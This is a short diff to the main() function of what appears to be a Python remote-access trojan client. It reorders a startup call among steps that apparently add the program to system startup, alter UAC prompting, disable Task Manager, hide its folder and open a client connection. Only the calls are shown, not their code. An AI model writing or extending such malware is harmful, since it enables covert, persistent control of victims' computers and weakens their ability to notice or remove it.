@@ -549,11 +549,11 @@ def have_internet():
 
 
 def main():
+    create_start()
     add_to_startup()
     set_uac_message("0")
     set_taskmgr("1")
     define_wol_settings()
-    create_start()
     hide_folder()
     global client
     client = Client(MAX_BYTES)
